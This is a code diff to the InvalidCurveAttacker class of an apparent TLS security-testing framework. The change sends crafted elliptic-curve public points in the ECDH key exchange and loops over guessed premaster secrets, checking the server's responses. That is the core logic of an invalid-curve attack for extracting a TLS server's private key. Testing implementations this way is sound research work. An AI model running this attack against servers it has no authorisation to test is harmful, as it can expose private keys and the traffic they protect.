@@ -9,10 +9,9 @@
 package de.rub.nds.tlsattacker.attacks.impl;
 
 import de.rub.nds.modifiablevariable.ModifiableVariableFactory;
-import de.rub.nds.modifiablevariable.biginteger.BigIntegerModificationFactory;
-import de.rub.nds.modifiablevariable.biginteger.ModifiableBigInteger;
 import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
 import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
+import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.tlsattacker.attacks.config.InvalidCurveAttackConfig;
 import de.rub.nds.tlsattacker.attacks.ec.ICEAttacker;
 import de.rub.nds.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
@@ -22,8 +21,9 @@ import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
 import de.rub.nds.tlsattacker.core.constants.KeyExchangeAlgorithm;
 import de.rub.nds.tlsattacker.core.crypto.ec.Curve;
 import de.rub.nds.tlsattacker.core.crypto.ec.CurveFactory;
+import de.rub.nds.tlsattacker.core.crypto.ec.ECComputer;
+import de.rub.nds.tlsattacker.core.crypto.ec.Point;
 import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
-import de.rub.nds.tlsattacker.core.protocol.message.AlertMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
@@ -43,6 +43,8 @@ import org.bouncycastle.util.BigIntegers;
 public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
 
     private static final Logger LOGGER = LogManager.getLogger(InvalidCurveAttacker.class);
+
+    private BigInteger premasterSecret;
 
     public InvalidCurveAttacker(InvalidCurveAttackConfig config) {
         super(config, false);
@@ -68,11 +70,32 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                     + config.createConfig().getDefaultSelectedCipherSuite().name());
             return null;
         }
+        ECComputer computer = new ECComputer();
+        CurveFactory.getNamedCurve(config.getNamedCurve().getJavaName());
+        Curve curve = CurveFactory.getNamedCurve(config.getNamedCurve().getJavaName());
+        computer.setCurve(curve);
+        Point point = new Point(config.getPublicPointBaseX(), config.getPublicPointBaseY());
         for (int i = 0; i < getConfig().getProtocolFlows(); i++) {
+            if (config.getPremasterSecret() != null) {
+                premasterSecret = config.getPremasterSecret();
+            } else {
+
+                computer.setSecret(BigInteger.valueOf(i + 1));
+                try {
+                    premasterSecret = computer.mul(point).getX();
+                    if (premasterSecret == null) {
+                        premasterSecret = BigInteger.ZERO;
+                    }
+                    LOGGER.debug(premasterSecret.toString());
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
             try {
                 WorkflowTrace trace = executeProtocolFlow();
                 if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace)) {
                     LOGGER.info("Did not receive ServerHello. Check your config");
+
                     return null;
                 }
                 if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, trace)) {
@@ -90,31 +113,29 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
 
     private WorkflowTrace executeProtocolFlow() {
         Config tlsConfig = config.createConfig();
+
         WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createHelloWorkflow();
         trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig), new ChangeCipherSpecMessage(
                 tlsConfig), new FinishedMessage(tlsConfig)));
-        trace.addTlsAction(new ReceiveAction(new AlertMessage(tlsConfig)));
+        trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
         State state = new State(tlsConfig, trace);
         WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                 tlsConfig.getWorkflowExecutorType(), state);
         ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
                 HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
 
-        // modify public point base X coordinate
-        ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
-        x.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseX()));
-        message.setPublicKeyBaseX(x);
-        // modify public point base Y coordinate
-        ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
-        y.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseY()));
-        message.setPublicKeyBaseY(y);
-        // set explicit premaster secret value (X value of the resulting point
-        // coordinate)
+        ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
+        byte[] points = ArrayConverter.concatenate(ArrayConverter.bigIntegerToByteArray(config.getPublicPointBaseX()),
+                ArrayConverter.bigIntegerToByteArray(config.getPublicPointBaseY()));
+        byte[] serialized = ArrayConverter.concatenate(new byte[] { 4 }, points);
+        serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
+        message.setPublicKey(serializedPublicKey);
         ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
-        byte[] explicitePMS = BigIntegers.asUnsignedByteArray(config.getCurveFieldSize(), config.getPremasterSecret());
-        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitePMS));
+        byte[] explicitPMS = BigIntegers.asUnsignedByteArray(config.getCurveFieldSize(), premasterSecret);
+        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));
         message.prepareComputations();
         message.getComputations().setPremasterSecret(pms);
+        LOGGER.info("working with the follwoing premaster secret: " + ArrayConverter.bytesToHexString(explicitPMS));
         workflowExecutor.executeWorkflow();
         return trace;
     }
